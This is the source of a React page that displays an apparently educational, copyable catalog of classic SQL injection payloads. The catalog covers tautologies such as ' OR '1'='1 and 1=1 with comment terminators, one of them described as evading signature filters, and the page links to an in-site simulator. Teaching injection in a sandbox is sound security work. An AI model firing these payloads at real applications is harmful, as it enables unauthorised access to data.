import React, { useState, useEffect, useRef } from 'react';
import { Link } from 'react-router-dom';
import { ArrowLeft, Terminal, Copy, Check, Search, Filter, ShieldAlert, BookOpen, Layers, CheckCircle2 } from 'lucide-react';

const payloadSections = [
  {
    id: 'classic-tautology',
    title: 'Classic Tautology',
    description: 'Tautology payloads inject a logical clause that always evaluates to true (e.g., 1=1). Because databases process OR logic sequentially, if one part of an OR clause is true, the entire WHERE condition becomes true, forcing the database to return all records regardless of the original filters.',
    payloads: [
      { code: "' OR '1'='1", desc: 'Standard breakout. Escapes single quote and inserts a always-true string evaluation.', tags: ['Standard', 'Quotes'] },
      { code: "' OR '1'='1' -- ", desc: 'String breakout followed by double-dash comment to ignore remaining server logic.', tags: ['Standard', 'Comment'] },
      { code: "' OR '1'='1' #", desc: 'String breakout followed by hash comment. Common in MySQL environments.', tags: ['MySQL', 'Comment'] },
      { code: "' OR 1=1 -- ", desc: 'Integer comparison tautology (faster database processing) with double-dash comment.', tags: ['Integer', 'Comment'] },
      { code: "' OR 1=1 #", desc: 'Integer comparison tautology with hash comment targeting MySQL syntax.', tags: ['MySQL', 'Integer'] },
      { code: "\"1' OR '1'='1", desc: 'Breakout variant starting with double quote and closing with single quote syntax.', tags: ['Variants'] },
      { code: "\"1' OR 1=1 -- ", desc: 'Variant breakout with single quote integer tautology and comment sequence.', tags: ['Variants', 'Comment'] },
      { code: "'' OR \"1\"=\"1\"", desc: 'Double-quote based tautology comparison. Successful if server uses double quotes internally.', tags: ['Quotes'] },
      { code: "'' OR 1=1 -- '", desc: 'Balanced breakout matching trailing single quote to maintain query syntax.', tags: ['Balanced', 'Comment'] },
    ]
  },
  {
    id: 'additional-classic-variations',
    title: 'Additional Classic Variations',
    description: 'A collection of standard logic variations. These are often used by penetration testers to probe how the database handles varying syntax, whitespace, and logical connectors like AND / OR combinations.',
    payloads: [
      { code: "1 OR 1=1 -- ", desc: 'Unquoted numeric parameter breakout. Targets integer fields (e.g., where ID = 1 OR 1=1).', tags: ['Numeric', 'Comment'] },
      { code: "' OR 2=2 -- ", desc: 'Slightly modified tautology comparison to bypass basic signature detectors looking for "1=1".', tags: ['Signature Bypass'] },
      { code: "anything' OR '1'='1", desc: 'String breakout starting with arbitrary characters, ensuring the OR clause executes.', tags: ['Standard'] },
      { code: "1' OR '1'='1' -- ", desc: 'Quoted parameter breakout with standard string tautology and comment.', tags: ['Variants', 'Comment'] },
      { code: "' OR '1'='1' AND '1'='1", desc: 'Chained logical expressions testing operator precedence rules in SQL logic.', tags: ['Precedence', 'Logic'] },
    ]
  }
];

export default function ClassicSqlInjection() {
  const [copiedText, setCopiedText] = useState(null);
  const [searchTerm, setSearchTerm] = useState('');
  
  const allPayloads = [];
  payloadSections.forEach(section => {
    section.payloads.forEach(p => {
      allPayloads.push({
        ...p,
        sectionId: section.id,
        sectionTitle: section.title
      });
    });
  });

  const filteredPayloads = allPayloads.filter((p) => {
    const query = searchTerm.toLowerCase();
    return (
      p.code.toLowerCase().includes(query) ||
      p.desc.toLowerCase().includes(query) ||
      p.tags.some((t) => t.toLowerCase().includes(query))
    );
  });
  // Copy handler
  const handleCopy = (text) => {
    navigator.clipboard.writeText(text);
    setCopiedText(text);
    setTimeout(() => setCopiedText(null), 2000);
  };

  return (
    <div className="space-y-10 select-none w-full max-w-5xl mx-auto">
      {/* Back Link */}
      <div className="flex items-center justify-between">
        <Link to="/payload-library" className="inline-flex items-center gap-2 text-xs font-mono text-cyber-dim hover:text-cyber-blue transition-colors">
          <ArrowLeft className="w-3.5 h-3.5" />
          back to payload library dashboard
        </Link>
        <span className="text-[10px] font-mono text-cyber-dim">MODULE: CLASSIC_SQLI_v1.0</span>
      </div>

      {/* Header Info */}
      <div className="flex flex-col gap-2 border-b border-cyber-border/40 pb-6 w-full relative">
        <div className="absolute -top-4 right-0 w-24 h-24 bg-cyber-blue/10 blur-[40px] rounded-full pointer-events-none" />
        <span className="text-xs font-mono font-bold text-cyber-blue tracking-[4px] uppercase flex items-center gap-2">
          <Terminal className="w-4.5 h-4.5 text-cyber-blue" />
          MODULE 01 — CLASSIC SQL INJECTION
        </span>
        <h1 className="text-3xl font-extrabold text-cyber-title tracking-wide uppercase">
          Classic SQL <span className="text-cyber-blue">Injection Payloads</span>
        </h1>
        <p className="text-cyber-dim text-sm text-justify leading-relaxed">
          Welcome to the interactive catalog of classic SQL injection payloads. Scroll down to inspect the catalog of tautologies and standard variations, copy ready-to-run payloads, or use our SQL construction simulator at the bottom to see how string breakouts escape code boundaries.
        </p>
      </div>

      {/* Main Payload Grid Section */}
      <div className="space-y-6">
        <div className="bg-cyber-card border border-cyber-border rounded-xl overflow-hidden shadow-lg">
          <div className="grid grid-cols-12 gap-3 px-6 py-3 border-b border-cyber-border bg-cyber-pre text-[10px] font-mono font-bold text-cyber-dim tracking-wider uppercase">
            <div className="col-span-4">Payload (SQL Code)</div>
            <div className="col-span-5">Mechanism & Impact Description</div>
            <div className="col-span-2">Tags</div>
            <div className="col-span-1 text-right">Actions</div>
          </div>

          <div className="divide-y divide-cyber-border/40 font-mono text-sm">
            {filteredPayloads.length > 0 ? (
              filteredPayloads.map((payload, pIdx) => (
                <div
                  key={pIdx}
                  className="grid grid-cols-12 gap-3 px-6 py-4 items-center hover:bg-cyber-blue/[0.02] transition-colors group"
                >
                  {/* Payload Code */}
                  <div className="col-span-4 select-text">
                    <code className="text-cyber-blue-light font-bold bg-cyber-pre/80 px-2.5 py-1.5 rounded-lg border border-cyber-border/60 block overflow-x-auto whitespace-nowrap">
                      {payload.code}
                    </code>
                  </div>

                  {/* Description */}
                  <div className="col-span-5 text-xs text-cyber-text leading-relaxed select-text font-sans">
                    {payload.desc}
                  </div>

                  {/* Tags */}
                  <div className="col-span-2 flex flex-wrap gap-1">
                    {payload.tags.map((tag, tIdx) => (
                      <span
                        key={tIdx}
                        className="text-[9px] font-bold uppercase tracking-wider bg-cyber-blue/10 border border-cyber-blue/20 text-cyber-blue-light px-1.5 py-0.2 rounded"
                      >
                        {tag}
                      </span>
                    ))}
                  </div>

                  {/* Actions */}
                  <div className="col-span-1 flex items-center justify-end gap-2">
                    <button
                      onClick={() => handleCopy(payload.code)}
                      className="p-1.5 rounded bg-cyber-pre border border-cyber-border hover:border-cyber-blue hover:bg-cyber-blue/5 text-cyber-dim hover:text-cyber-blue-light transition-all cursor-pointer relative"
                      title="Copy payload to clipboard"
                    >
                      {copiedText === payload.code ? (
                        <Check className="w-3.5 h-3.5 text-cyber-green" />
                      ) : (
                        <Copy className="w-3.5 h-3.5" />
                      )}
                    </button>
                  </div>
                </div>
              ))
            ) : (
              <div className="px-6 py-12 text-center text-cyber-dim font-mono text-sm">
                No matching payloads found for "{searchTerm}"
              </div>
            )}
          </div>
        </div>
      </div>



      {/* Sandbox Redirection */}
      <div className="bg-cyber-card border border-cyber-border/70 rounded-2xl p-8 text-center space-y-5 shadow-2xl relative overflow-hidden">
        <span className="absolute top-0 left-0 right-0 h-[2px] bg-gradient-to-r from-transparent via-cyber-blue to-transparent" />
        <h3 className="font-sans font-extrabold text-lg text-cyber-title tracking-wider uppercase">
          Simulate this in our Interactive Terminal Environment!
        </h3>
        <p className="text-sm text-cyber-text text-justify leading-relaxed">
          Take these payloads and inject them in our active SQL Injection Simulator to witness real-time response tables, logs, error dumps, and verify mitigation bypasses!
        </p>
        <div className="pt-2 flex justify-center">
          <Link
            to="/attacks/classic-injection"
            className="inline-flex items-center justify-center gap-2 bg-cyber-blue hover:bg-cyber-blue-light text-white px-8 py-3.5 rounded-xl text-xs font-bold uppercase tracking-wider transition-all cursor-pointer shadow-[0_0_15px_rgba(26,106,255,0.3)] hover:shadow-[0_0_25px_rgba(26,106,255,0.5)] transform hover:-translate-y-0.5"
          >
            Launch Live Classic SQLi Simulator
          </Link>
        </div>
      </div>
    </div>
  );
}
